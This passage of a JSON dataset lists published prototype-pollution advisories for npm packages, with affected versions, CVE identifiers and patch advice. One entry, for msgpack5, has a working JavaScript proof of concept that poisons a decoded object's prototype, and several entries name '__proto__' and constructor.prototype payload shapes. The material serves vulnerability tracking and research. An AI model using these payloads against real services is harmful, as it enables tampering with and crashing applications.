      "date": "2021-05-10T19:16:14Z",
      "cve": "CVE-2020-7768",
      "year": 2020
   },
   {
      "package": {
         "raw": "chart.js@2.9.3",
         "name": "chart.js",
         "version": "2.9.3"
      },
      "id": "GHSA-h68q-55jf-x68w",
      "description": "This affects the package chart.js before 2.9.4. The options parameter is not properly sanitized when it is processed. When the options are processed, the existing options (or the defaults options) are deeply merged with provided options. However, during this operation, the keys of the object being set are not checked, leading to a prototype pollution.",
      "summary": "Prototype pollution in chart.js",
      "date": "2021-05-10T18:47:53Z",
      "cve": "CVE-2020-7746",
      "year": 2020
   },
   {
      "package": {
         "raw": "irrelon-path@2.0.5",
         "name": "irrelon-path",
         "version": "2.0.5"
      },
      "id": "GHSA-j7cg-h9v9-6vqp",
      "description": "The package irrelon-path before 4.7.0; the package @irrelon/path before 4.7.0 are vulnerable to Prototype Pollution via the set, unSet, pushVal and pullVal functions.",
      "summary": "Prototype Pollution in irrelon-path and @irrelon/path",
      "date": "2021-05-06T17:29:19Z",
      "cve": "CVE-2020-7708",
      "year": 2020
   },
   {
      "package": {
         "raw": "backbone-query-parameters@0.4.0",
         "name": "backbone-query-parameters",
         "version": "0.4.0"
      },
      "id": "GHSA-8qpm-5c82-rf96",
      "description": "Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') in backbone-query-parameters 0.4.0 allows a malicious user to inject properties into Object.prototype.",
      "summary": "Prototype Pollution in backbone-query-parameters",
      "date": "2021-05-06T15:52:02Z",
      "cve": "CVE-2021-20085",
      "year": 2021
   },
   {
      "package": {
         "raw": "multi-ini@2.1.1",
         "name": "multi-ini",
         "version": "2.1.1"
      },
      "id": "GHSA-67mq-h2r9-rh2m",
      "description": "This affects the package multi-ini before 2.1.2. It is possible to pollute an object's prototype by specifying the constructor.proto object as part of an array. This is a bypass of CVE-2020-28448.",
      "summary": "Prototype pollution in multi-ini",
      "date": "2021-04-13T15:23:41Z",
      "cve": "CVE-2020-28460",
      "year": 2020
   },
   {
      "package": {
         "raw": "msgpack5@3.6.0",
         "name": "msgpack5",
         "version": "3.6.0"
      },
      "id": "GHSA-gmjw-49p4-pcfm",
      "description": "### Impact\n\nThe issue is as follows: when `msgpack5` decodes a map containing a \nkey `\"__proto__\"`, it assigns the decoded value to `__proto__`. As you \nare no doubt aware, `Object.prototype.__proto__` is an accessor \nproperty for the receiver's prototype. If the value corresponding to \nthe key `__proto__` decodes to an object or `null`, `msgpack5` sets \nthe decoded object's prototype to that value. \n\nAn attacker who can submit crafted MessagePack data to a service can \nuse this to produce values that appear to be of other types; may have \nunexpected prototype properties and methods (for example `length`, \nnumeric properties, and `push` et al if `__proto__`'s value decodes to \nan `Array`); and/or may throw unexpected exceptions when used (for \nexample if the `__proto__` value decodes to a `Map` or `Date`). Other \nunexpected behavior might be produced for other types. \n\nThere is no effect on the global prototype.\n\nAn example: \n\n```js \nconst msgpack5 = require('msgpack5')(); \n\nconst payload = {}; \nObject.defineProperty(payload, '__proto__', { \nvalue: new Map().set(1, 2), \nenumerable: true \n}); \n\nconst encoded = msgpack5.encode(payload); \nconsole.log(encoded); // <Buffer 81 a9 5f 5f 70 72 6f 74 6f 5f 5f 81 01 02> \n\nconst decoded = msgpack5.decode(encoded); \n\n// decoded's prototype has been overwritten \nconsole.log(Object.getPrototypeOf(decoded)); // Map(1) { 1 => 2 } \nconsole.log(decoded.get); // [Function: get] \n\n// decoded appears to most common typechecks to be a Map \nconsole.log(decoded instanceof Map); // true \nconsole.log(decoded.toString()); // [object Map] \nconsole.log(Object.prototype.toString.call(decoded)); // [object Map] \nconsole.log(decoded.constructor.name); // Map \nconsole.log(Object.getPrototypeOf(decoded).constructor.name); // Map \n\n// decoded is not, however, a Map \nconsole.log(Object.getPrototypeOf(decoded) === Map.prototype); // false \n\n// using decoded as though it were a Map throws \ntry { \ndecoded.get(1); \n} catch (error) { \nconsole.log(error); // TypeError: Method Map.prototype.get called \n// on incompatible receiver #<Map> \n} \ntry { \ndecoded.size; \n} catch (error) { \nconsole.log(error); // TypeError: Method get Map.prototype.size \n// called on incompatible receiver #<Map> \n} \n\n// re-encoding the decoded value throws \ntry { \nmsgpack5.encode(decoded); \n} catch (error) { \nconsole.log(error); // TypeError: Method Map.prototype.entries \n// called on incompatible receiver #<Map> \n} \n``` \n\nThis \"prototype poisoning\" is sort of a very limited inversion of a \nprototype pollution attack. Only the decoded value's prototype is \naffected, and it can only be set to `msgpack5` values (though if the \nvictim makes use of custom codecs, anything could be a `msgpack5` \nvalue). We have not found a way to escalate this to true prototype \npollution (absent other bugs in the consumer's code). \n\n### Patches\n\nVersions v5.2.1, v4.5.1, v3.6.1 include the fix.\n\n### Workarounds\n\nAlways validate incoming data after parsing before doing any processing.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [example link to repo](http://example.com)\n* Email us at [example email address](mailto:example@example.com)",
      "summary": "Prototype poisoning",
      "date": "2021-03-12T22:44:17Z",
      "cve": "CVE-2021-21368",
      "year": 2021
   },
   {
      "package": {
         "raw": "@node-red/runtime@1.2.7",
         "name": "runtime",
         "version": "1.2.7",
         "scope": "node-red"
      },
      "id": "GHSA-xp9c-82x8-7f67",
      "description": "### Impact\n\nNode-RED 1.2.7 and earlier contains a Prototype Pollution vulnerability in the admin API. A badly formed request can modify the prototype of the default JavaScript Object with the potential to affect the default behaviour of the Node-RED runtime.\n\n### Patches\n\nThe vulnerability is patched in the 1.2.8 release.\n\n### Workarounds\n\nA workaround is to ensure only authorised users are able to access the editor url.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [team@nodered.org](mailto:team@nodered.org)\n\n### Acknowledgements\n\nThanks to the Tencent Woodpecker Security Team for disclosing this vulnerability.",
      "summary": "Prototype Pollution in Node-Red",
      "date": "2021-02-26T16:31:05Z",
      "cve": "CVE-2021-21297",
      "year": 2021
   },
   {
      "package": {
         "raw": "dynamoose@2.6.0",
         "name": "dynamoose",
         "version": "2.6.0"
      },
      "id": "GHSA-rrqm-p222-8ph2",
      "description": "### Impact\n\nIn Dynamoose versions 2.0.0-2.6.0 there was a prototype pollution vulnerability in the internal utility method [`lib/utils/object/set.ts`](https://github.com/dynamoose/dynamoose/blob/master/lib/utils/object/set.ts). This method is used throughout the codebase for various operations throughout Dynamoose.\n\nWe have not seen any evidence of this vulnerability being exploited.\n\nWe do not believe this issue impacts v1.x.x since this method was added as part of the v2 rewrite. This vulnerability also impacts v2.x.x beta/alpha versions.\n\n### Patches\n\nv2.7.0 includes a patch for this vulnerability.\n\n### Workarounds\n\nWe are unaware of any workarounds to patch this vulnerability other than upgrading to v2.7.0 or greater.\n\n### References\n\n- Patch commit hash: 324c62b4709204955931a187362f8999805b1d8e\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* [Contact me](https://charlie.fish/contact)\n* [Read our Security Policy](https://github.com/dynamoose/dynamoose/blob/master/SECURITY.md)\n\n### Credit\n\n- GitHub CodeQL Code Scanning",
      "summary": "Prototype Pollution in Dynamoose",
      "date": "2021-02-08T17:44:01Z",
      "cve": "CVE-2021-21304",
      "year": 2021
   },
   {
      "package": {
         "raw": "@hapi/hoek@8.5.0",
         "name": "hoek",
         "version": "8.5.0",
         "scope": "hapi"
      },
      "id": "GHSA-22h7-7wwg-qmgg",
      "description": "Versions of `@hapi/hoek` prior to 8.5.1 and 9.0.3 are vulnerable to Prototype Pollution. The `clone` function fails to prevent the modification of the Object prototype when passed specially-crafted input. Attackers may use this to change existing properties that exist in all objects, which may lead to Denial of Service or Remote Code Execution in specific circumstances.  \nThis issue __does not__ affect hapi applications since the framework protects against such malicious inputs. Applications that use `@hapi/hoek` outside of the hapi ecosystem may be vulnerable.\n\n\n## Recommendation\n\nUpdate to version 8.5.1, 9.0.3 or later.",
      "summary": "Prototype Pollution in @hapi/hoek",
      "date": "2020-09-04T17:56:39Z",
      "cve": null,
      "year": 2020
   },
   {
      "package": {
         "raw": "klona@1.1.0",
         "name": "klona",
         "version": "1.1.0"
      },
      "id": "GHSA-4r97-78gf-q24v",
      "description": "Versions of `klona` prior to 1.1.1 are vulnerable to prototype pollution. The package does not restrict the modification of an Object's prototype when cloning objects, which may allow an attacker to add or modify an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpgrade to version 1.1.1 or later.",
      "summary": "Prototype Pollution in klona",
      "date": "2020-09-04T17:53:27Z",
      "cve": null,
      "year": 2020
   },
   {
      "package": {
         "raw": "safe-object2@1.0.3",
         "name": "safe-object2",
         "version": "1.0.3"
      },
      "id": "GHSA-qccf-q7p4-3q3j",
      "description": "All versions of `safe-object2` are vulnerable to prototype pollution. The `settter()` function does not restrict the modification of an Object's prototype, which may allow an attacker to add or modify an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative package until a fix is made available.",
      "summary": "Prototype Pollution in safe-object2",
      "date": "2020-09-04T15:16:42Z",
      "cve": null,
      "year": 2020
   },
   {
      "package": {
         "raw": "deep-setter@1.0.2",
         "name": "deep-setter",
         "version": "1.0.2"
      },
      "id": "GHSA-9qrg-h9g8-c65q",
      "description": "All versions of `deep-setter` are vulnerable to prototype pollution. The package does not restrict the modification of an Object's prototype, which may allow an attacker to add or modify an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative package until a fix is made available.",
      "summary": "Prototype Pollution in deep-setter",
      "date": "2020-09-04T15:14:26Z",
      "cve": null,
      "year": 2020
   },
   {
      "package": {
         "raw": "get-setter@0.0.0",
         "name": "get-setter",
         "version": "0.0.0"
      },
      "id": "GHSA-ch82-gqh6-9xj9",
      "description": "All versions of `get-setter` are vulnerable to prototype pollution. The function `set` does not restrict the modification of an Object's prototype, which may allow an attacker to add or modify an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative package until a fix is made available.",
      "summary": "Prototype Pollution in get-setter",
      "date": "2020-09-04T15:13:19Z",
      "cve": null,
      "year": 2020
   },
   {
      "package": {
         "raw": "reggae@0.0.2",
         "name": "reggae",
         "version": "0.0.2"
      },
      "id": "GHSA-q9wr-gcjc-hq52",
      "description": "All versions of `reggae` are vulnerable to prototype pollution. The function `set` does not restrict the modification of an Object's prototype, which may allow a malicious to add or modify an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative package until a fix is made available.",
      "summary": "Prototype Pollution in reggae",
      "date": "2020-09-04T15:12:13Z",
      "cve": null,
      "year": 2020
   },
   {
      "package": {
         "raw": "unflatten@1.0.4",
         "name": "unflatten",
         "version": "1.0.4"
      },
      "id": "GHSA-6fh5-8wq8-w3wr",
      "description": "All versions of `unflatten` are vulnerable to prototype pollution. The function `unflatten` does not restrict the modification of an Object's prototype, which may allow an attacker to add or modify an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative package until a fix is made available.",
      "summary": "Prototype Pollution in unflatten",
      "date": "2020-09-04T15:09:55Z",
      "cve": null,
      "year": 2020
   },
   {
      "package": {
         "raw": "handlebars@3.0.7",
         "name": "handlebars",
         "version": "3.0.7"
      },
      "id": "GHSA-g9r4-xpmj-mj65",
      "description": "Versions of `handlebars` prior to 3.0.8 or 4.5.3 are vulnerable to prototype pollution. It is possible to add or modify properties to the Object prototype through a malicious template. This may allow attackers to crash the application or execute Arbitrary Code in specific conditions.\n\n\n## Recommendation\n\nUpgrade to version 3.0.8, 4.5.3 or later.",
      "summary": "Prototype Pollution in handlebars",
      "date": "2020-09-04T15:06:32Z",
      "cve": null,
      "year": 2020
   },
   {
      "package": {
         "raw": "lodash.mergewith@4.6.1",
         "name": "lodash.mergewith",
         "version": "4.6.1"
      },
      "id": "GHSA-779f-wgxg-qr8f",
      "description": "Versions of `lodash.mergewith` before 4.6.2 are vulnerable to prototype pollution. The function `mergeWith` may allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.6.2 or later.",
      "summary": "Prototype Pollution in lodash.mergewith",
      "date": "2020-09-03T18:10:22Z",
      "cve": null,
      "year": 2020
   },
   {
      "package": {
         "raw": "lodash.defaultsdeep@4.6.0",
         "name": "lodash.defaultsdeep",
         "version": "4.6.0"
      },
      "id": "GHSA-46fh-8fc5-xcwx",
      "description": "Versions of `lodash.defaultsdeep` before 4.6.1 are vulnerable to Prototype Pollution. The function 'defaultsDeep' may allow a malicious user to modify the prototype of `Object` via `__proto__` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.6.1 or later.",
      "summary": "Prototype Pollution in lodash.defaultsdeep",
      "date": "2020-09-03T18:09:16Z",
      "cve": null,
      "year": 2020
   },
   {
      "package": {
         "raw": "lodash.mergewith@4.6.0",
         "name": "lodash.mergewith",
         "version": "4.6.0"
      },
      "id": "GHSA-5947-m4fg-xhqg",
      "description": "Versions of `lodash.mergewith` before 4.6.1 are vulnerable to Prototype Pollution. The function 'mergeWith' may allow a malicious user to modify the prototype of `Object` via `__proto__` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.6.1 or later.",
      "summary": "Prototype Pollution in lodash.mergewith",
      "date": "2020-09-03T18:08:10Z",
      "cve": null,
      "year": 2020
   },
   {
      "package": {
         "raw": "lodash.defaultsdeep@4.6.0",
         "name": "lodash.defaultsdeep",
         "version": "4.6.0"
      },
      "id": "GHSA-h5mp-5q4p-ggf5",
      "description": "Versions of `lodash.defaultsdeep` before 4.6.1 are vulnerable to prototype pollution. The function `mergeWith` may allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.6.1 or later.",
      "summary": "Prototype Pollution in lodash.defaultsdeep",
      "date": "2020-09-03T18:07:05Z",
      "cve": null,
      "year": 2020
   },
   {
      "package": {
         "raw": "lodash.merge@4.6.0",
         "name": "lodash.merge",
         "version": "4.6.0"
      },
      "id": "GHSA-2m96-9w4j-wgv7",
      "description": "Versions of `lodash.merge` before 4.6.1 are vulnerable to Prototype Pollution. The function 'merge' may allow a malicious user to modify the prototype of `Object` via `__proto__` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.6.1 or later.",
      "summary": "Prototype Pollution in lodash.merge",
      "date": "2020-09-03T18:06:00Z",
      "cve": null,
      "year": 2020
   },
   {
      "package": {
         "raw": "@commercial/subtext@5.1.1",
         "name": "subtext",
         "version": "5.1.1",
         "scope": "commercial"
      },
      "id": "GHSA-36c4-4r89-6whg",
      "description": "Versions of `@commercial/subtext` prior to 5.1.2 are vulnerable to Prototype Pollution. A multipart payload can be constructed in a way that one of the parts’ content can be set as the entire payload object’s prototype. If this prototype contains data, it may bypass other validation rules which enforce access and privacy. If this prototype evaluates to null, it can cause unhandled exceptions when the request payload is accessed.\n\n\n## Recommendation\n\nUpgrade to version 5.1.2 or later.",
      "summary": "Prototype Pollution in @commercial/subtext",
      "date": "2020-09-03T15:49:02Z",
      "cve": null,
      "year": 2020
   },
   {
      "package": {
         "raw": "@hapi/subtext@6.1.2",
         "name": "subtext",
         "version": "6.1.2",
         "scope": "hapi"
      },
      "id": "GHSA-g9cg-h3jm-cwrc",
      "description": "Versions of `@hapi/subtext` prior to 6.1.3 or 7.0.3 are vulnerable to Prototype Pollution. A multipart payload can be constructed in a way that one of the parts’ content can be set as the entire payload object’s prototype. If this prototype contains data, it may bypass other validation rules which enforce access and privacy. If this prototype evaluates to null, it can cause unhandled exceptions when the request payload is accessed.\n\n\n## Recommendation\n\nUpgrade to versions 6.1.3, 7.0.3 or later.",
      "summary": "Prototype Pollution in @hapi/subtext",
      "date": "2020-09-03T15:47:23Z",
      "cve": null,
      "year": 2020
   },
   {
      "package": {
         "raw": "subtext@5.1.3",
         "name": "subtext",
         "version": "5.1.3"
      },
      "id": "GHSA-g64q-3vg8-8f93",
      "description": "All versions of `subtext` are vulnerable to Prototype Pollution. A multipart payload can be constructed in a way that one of the parts’ content can be set as the entire payload object’s prototype. If this prototype contains data, it may bypass other validation rules which enforce access and privacy. If this prototype evaluates to null, it can cause unhandled exceptions when the request payload is accessed.\n\n\n## Recommendation\n\nThis package is deprecated and is now maintained as `@hapi/subtext`. Please update your dependencies to use `@hapi/subtext`. ",
      "summary": "Prototype Pollution in subtext",
      "date": "2020-09-03T15:47:10Z",
      "cve": null,
      "year": 2020
   },
   {
      "package": {
         "raw": "merge-objects@1.0.5",
         "name": "merge-objects",
         "version": "1.0.5"
      },
      "id": "GHSA-992f-wf4w-x36v",
      "description": "All versions of `merge-objects` are vulnerable to Prototype Pollution.\n\n\n## Recommendation\n\nNo fix is available for this vulnerability at this time. It is our recommendation to use an alternative package.",
      "summary": "Prototype Pollution in merge-objects",
      "date": "2020-09-01T21:16:13Z",
      "cve": null,
      "year": 2020
   },
   {
      "package": {
         "raw": "express-fileupload@1.1.8",
         "name": "express-fileupload",
         "version": "1.1.8"
      },
      "id": "GHSA-9wcg-jrwf-8gg7",
      "description": "This affects the package express-fileupload before 1.1.8. If the parseNested option is enabled, sending a corrupt HTTP request can lead to denial of service or arbitrary code execution.",
      "summary": "Prototype Pollution in express-fileupload",
      "date": "2020-08-05T14:53:16Z",
      "cve": "CVE-2020-7699",
      "year": 2020
   },
   {
      "package": {
         "raw": "dojo@1.11.9",
         "name": "dojo",
         "version": "1.11.9"
      },
      "id": "GHSA-jxfh-8wgv-vfr2",
      "description": "In affected versions of dojo (NPM package), the deepCopy method is vulnerable to Prototype Pollution.\n\nPrototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects.\nAn attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values. \n\nThis has been patched in versions 1.12.8, 1.13.7, 1.14.6, 1.15.3 and 1.16.2",
      "summary": "Prototype pollution in dojo",
      "date": "2020-03-10T18:03:14Z",
      "cve": "CVE-2020-5258",
      "year": 2020
   },
   {
      "package": {
         "raw": "handlebars@4.2.2",
         "name": "handlebars",
         "version": "4.2.2"
      },
      "id": "GHSA-w457-6q6x-cgp9",
      "description": "Versions of `handlebars` prior to 3.0.8 or 4.3.0 are vulnerable to Prototype Pollution leading to Remote Code Execution. Templates may alter an Objects' `__proto__` and `__defineGetter__` properties, which may allow an attacker to execute arbitrary code through crafted payloads.\n\n\n## Recommendation\n\nUpgrade to version 3.0.8, 4.3.0 or later.",
      "summary": "Prototype Pollution in handlebars",
      "date": "2019-12-26T17:58:13Z",
      "cve": "CVE-2019-19919",
      "year": 2019
   },
   {
      "package": {
         "raw": "angular@1.7.8",
         "name": "angular",
         "version": "1.7.8"
      },
      "id": "GHSA-89mq-4x47-5v83",
      "description": "Versions of `angular ` prior to 1.7.9 are vulnerable to prototype pollution. The deprecated API function `merge()` does not restrict the modification of an Object's prototype in the , which may allow an attacker to add or modify an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpgrade to version 1.7.9 or later. The function was already deprecated and upgrades are not expected to break functionality.",
      "summary": "Prototype Pollution in angular",
      "date": "2019-11-20T15:29:43Z",
      "cve": "CVE-2019-10768",
      "year": 2019
   },
   {
      "package": {
         "raw": "set-value@2.0.0",
         "name": "set-value",
         "version": "2.0.0"
      },
      "id": "GHSA-4g88-fppr-53pp",
      "description": "Versions of `set-value` prior to 3.0.1 or 2.0.1 are vulnerable to Prototype Pollution. The `set` function fails to validate which Object properties it updates. This allows attackers to modify the prototype of Object, causing the addition or modification of an existing property on all objects.\n\n\n\n\n## Recommendation\n\nIf you are using `set-value` 3.x, upgrade to version 3.0.1 or later.\nIf you are using `set-value` 2.x, upgrade to version 2.0.1 or later.",
      "summary": "Prototype Pollution in set-value",
      "date": "2019-08-27T17:43:33Z",
      "cve": "CVE-2019-10747",
      "year": 2019
   },
   {
      "package": {
         "raw": "@apollo/gateway@0.6.1",
         "name": "gateway",
         "version": "0.6.1",
         "scope": "apollo"
      },
      "id": "GHSA-74cr-77xc-8g6r",
      "description": "Versions of `@apollo/gateway` prior to 0.6.2 are vulnerable to Prototype Pollution. The package uses deepMerge() to merge objects, which may allow attackers to alter the Object prototype through queries with GraphQL aliases. Carefully constructed payloads can override properties of all objects in the application. This may lead to Denial of Service or may be chained with other vulnerabilities leading to Remote Code Execution.\n\n\n## Recommendation\n\nUpgrade to version 0.6.2 or later.\n",
      "summary": "Prototype Pollution in @apollo/gateway",
      "date": "2019-06-13T20:37:39Z",
      "cve": null,
      "year": 2019
   },
   {
      "package": {
         "raw": "querystringify@1.0.0",
         "name": "querystringify",
         "version": "1.0.0"
      },
      "id": "GHSA-hxcm-v35h-mg2x",
      "description": "A vulnerability was found in querystringify before 2.0.0. It's possible to override built-in properties of the resulting query string object if a malicious string is inserted in the query string.",
      "summary": "Prototype Pollution in querystringify",
      "date": "2019-06-07T21:12:50Z",
      "cve": null,
      "year": 2019
   },
   {
      "package": {
         "raw": "mpath@0.5.0",
         "name": "mpath",
         "version": "0.5.0"
      },
      "id": "GHSA-h466-j336-74wx",
      "description": "Versions of `mpath` before 0.5.1 are vulnerable to prototype pollution. Provided certain input `mpath` can add or modify properties of the `Object` prototype. These properties will be present on all objects.\n\n\n## Recommendation\n\nUpdate to version `0.5.1` or later.",
      "summary": "Prototype Pollution in mpath",
      "date": "2019-02-07T18:17:26Z",
      "cve": "CVE-2018-16490",
      "year": 2018
   },
   {
      "package": {
         "raw": "merge@1.2.0",
         "name": "merge",
         "version": "1.2.0"
      },
      "id": "GHSA-f9cm-qmx5-m98h",
      "description": "Versions of `merge` before 1.2.1 are vulnerable to prototype pollution. The `merge.recursive` function can be tricked into adding or modifying properties of the Object prototype.\n\n\n## Recommendation\n\nUpdate to version 1.2.1 or later.",
      "summary": "Prototype Pollution in merge",
      "date": "2018-11-01T14:45:42Z",
      "cve": "CVE-2018-16469",
      "year": 2018
   },
   {
      "package": {
         "raw": "lodash@4.17.4",
         "name": "lodash",
         "version": "4.17.4"
      },
      "id": "GHSA-fvqr-27wr-82fm",
      "description": "Versions of `lodash` before 4.17.5 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `__proto__` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.5 or later.",
      "summary": "Prototype Pollution in lodash",
      "date": "2018-07-26T15:14:52Z",
      "cve": "CVE-2018-3721",
      "year": 2018
   },
   {
      "package": {
         "raw": "assign-deep@0.4.6",
         "name": "assign-deep",
         "version": "0.4.6"
      },
      "id": "GHSA-xcvv-84j5-jw9h",
      "description": "Versions of `assign-deep` before 0.4.7 are vulnerable to prototype pollution via merging functions.\n\n\n## Recommendation\n\nUpdate to version 0.4.7 or later.",
      "summary": "Prototype Pollution in assign-deep",
      "date": "2018-07-26T15:12:31Z",
      "cve": "CVE-2018-3720",
      "year": 2018
   },
   {
      "package": {
         "raw": "@intlify/core-base@9.1.10",
         "name": "core-base",
         "version": "9.1.10",
         "scope": "intlify"
      },
      "id": "SNYK-JS-INTLIFYCOREBASE-9376704",
      "description": "@intlify/core-base is a @intlify/core-base\nAffected versions of this package are vulnerable to Prototype Pollution through the handleFlatJson function due to improper input validation. An attacker can introduce or modify properties within the global prototype chain, potentially causing denial of service or escalating to execute arbitrary commands within the application's context if the polluted property interacts with sensitive Node.js APIs like exec or eval.\n",
      "summary": "Prototype Pollution  Affecting @intlify/core-base package, versions >=9.1.0 <9.1.11",
      "date": "7 Mar 2025",
      "cve": "CVE-2025-27597",
      "year": 2025
   },
   {
      "package": {
         "raw": "parse-git-config@3.0.0",
         "name": "parse-git-config",
         "version": "3.0.0"
      },
      "id": "SNYK-JS-PARSEGITCONFIG-9403763",
      "description": "parse-git-config is a Parse .git/config into a JavaScript object. sync or async.\nAffected versions of this package are vulnerable to Prototype Pollution via the expandKeys function. An attacker can obtain sensitive information by exploiting the improper handling of key expansion.\n",
      "summary": "Prototype Pollution  Affecting parse-git-config package, versions *",
      "date": "12 Mar 2025",
      "cve": "CVE-2025-25975",
      "year": 2025
   },
   {
      "package": {
         "raw": "whet.extend@0.9.9",
         "name": "whet.extend",
         "version": "0.9.9"
      },
      "id": "SNYK-JS-WHETEXTEND-3178372",
      "description": "whet.extend is an A sharped version of port of jQuery.extend that actually works on node.js\nAffected versions of this package are vulnerable to Prototype Pollution due to improper user input sanitization when using the extend and _findValue functions.\n",
      "summary": "Prototype Pollution  Affecting whet.extend package, versions *",
      "date": "21 Dec 2022",
      "year": 2022
   },
   {
      "package": {
         "raw": "utile@0.3.0",
         "name": "utile",
         "version": "0.3.0"
      },
      "id": "SNYK-JS-UTILE-8706797",
      "description": "utile is a drop-in replacement for util with some additional advantageous functions.\nAffected versions of this package are vulnerable to Prototype Pollution through the createPath function. An attacker can disrupt service by supplying a crafted payload with Object.prototype setter to introduce or modify properties within the global prototype chain.\n",
      "summary": "Prototype Pollution  Affecting utile package, versions *",
      "date": "5 Feb 2025",
      "cve": "CVE-2024-57065",
      "year": 2024
   },
   {
      "package": {
         "raw": "cli-util@1.1.27",
         "name": "cli-util",
         "version": "1.1.27"
      },
      "id": "SNYK-JS-CLIUTIL-8706724",
      "description": "cli-util is an Utility functions for the cli toolkit\nAffected versions of this package are vulnerable to Prototype Pollution through the lib.merge function. An attacker can disrupt service by supplying a crafted payload with Object.prototype setter to introduce or modify properties within the global prototype chain.\n",
      "summary": "Prototype Pollution  Affecting cli-util package, versions *",
      "date": "5 Feb 2025",
      "cve": "CVE-2024-57078",
      "year": 2024
   },
   {
      "package": {
         "raw": "@c3/utils-1@1.0.131",
         "name": "utils-1",
         "version": "1.0.131",
         "scope": "c3"
      },
      "id": "SNYK-JS-C3UTILS1-7417399",
      "description": "@c3/utils-1 is a > TODO: description\nAffected versions of this package are vulnerable to Prototype Pollution via the assign() or set() function.\n",
      "summary": "Prototype Pollution  Affecting @c3/utils-1 package, versions *",
      "date": "1 Jul 2024",
      "cve": "CVE-2024-39016",
      "year": 2024
   },
   {
      "package": {
         "raw": "@cahil/utils@2.3.2",
         "name": "utils",
         "version": "2.3.2",
         "scope": "cahil"
      },
      "id": "SNYK-JS-CAHILUTILS-7417401",
      "description": "@cahil/utils is a Various utility functions that might come in handy when building things in JavaScript\nAffected versions of this package are vulnerable to Prototype Pollution in the set() function.\n",
      "summary": "Prototype Pollution  Affecting @cahil/utils package, versions *",
      "date": "1 Jul 2024",
      "cve": "CVE-2024-39014",
      "year": 2024
   },
   {
      "package": {
         "raw": "@alexbinary/object-deep-assign@1.0.11",
         "name": "object-deep-assign",
         "version": "1.0.11",
         "scope": "alexbinary"
      },
      "id": "SNYK-JS-ALEXBINARYOBJECTDEEPASSIGN-7268042",
      "description": "@alexbinary/object-deep-assign is a Like Object.assign() but deep 😱\nAffected versions of this package are vulnerable to Prototype Pollution in the extend() function, due to unchecked recursive copy.\n",
      "summary": "Prototype Pollution  Affecting @alexbinary/object-deep-assign package, versions *",
      "date": "17 Jun 2024",
      "cve": "CVE-2024-36582",
      "year": 2024
   },
   {
      "package": {
         "raw": "node-opcua-alarm-condition@2.134.0",
         "name": "node-opcua-alarm-condition",
         "version": "2.134.0"
      },
      "id": "SNYK-JS-NODEOPCUAALARMCONDITION-8708050",
      "description": "node-opcua-alarm-condition is a pure nodejs OPCUA SDK - module pseudo-session\nAffected versions of this package are vulnerable to Prototype Pollution in the fieldsToJson() function.\n",
      "summary": "Prototype Pollution  Affecting node-opcua-alarm-condition package, versions <2.137.0",
      "date": "5 Feb 2025",
      "cve": "CVE-2024-57086",
      "year": 2024
   },
   {
      "package": {
         "raw": "@apollo/gateway@0.6.1",
         "name": "gateway",
         "version": "0.6.1",
         "scope": "apollo"
      },
      "id": "SNYK-JS-APOLLOGATEWAY-174915",
      "description": "@apollo/gateway is a library exporting utility functions.\nAffected versions of this package are vulnerable to Prototype Pollution. The exported function deepMerge() does not block merging of __proto__ keys.\n",
      "summary": "Prototype Pollution  Affecting @apollo/gateway package, versions <0.6.2",
      "date": "4 Jun 2019",
      "year": 2019
   },
   {
      "package": {
         "raw": "@stryker-mutator/util@8.7.0",
         "name": "util",
         "version": "8.7.0",
         "scope": "stryker-mutator"
      },
      "id": "SNYK-JS-STRYKERMUTATORUTIL-8706737",
      "description": "@stryker-mutator/util is a Contains utilities for Stryker, the mutation testing framework for JavaScript and friends\nAffected versions of this package are vulnerable to Prototype Pollution via the deepMerge function. An attacker can disrupt service by supplying a crafted payload with Object.prototype setter to introduce or modify properties within the global prototype chain.\n",
      "summary": "Prototype Pollution  Affecting @stryker-mutator/util package, versions <8.7.1",
      "date": "5 Feb 2025",
      "cve": "CVE-2024-57085",
      "year": 2024
   },
   {
      "package": {
         "raw": "dot-qs@0.2.0",
         "name": "dot-qs",
         "version": "0.2.0"
      },
      "id": "SNYK-JS-DOTQS-8709975",
      "description": "dot-qs is a Dot separated format version of node-querystring\nAffected versions of this package are vulnerable to Prototype Pollution in the parse() function.\n",
      "summary": "Prototype Pollution  Affecting dot-qs package, versions *",
      "date": "5 Feb 2025",
      "cve": "CVE-2024-57067",
      "year": 2024
   },
   {
      "package": {
         "raw": "php-date-formatter@1.3.6",
         "name": "php-date-formatter",
         "version": "1.3.6"
      },
      "id": "SNYK-JS-PHPDATEFORMATTER-8709964",
      "description": "php-date-formatter is an A Javascript datetime formatting and manipulation library using PHP date-time formats.\nAffected versions of this package are vulnerable to Prototype Pollution in php-date-formatter.js.\n",
      "summary": "Prototype Pollution  Affecting php-date-formatter package, versions <1.3.7",
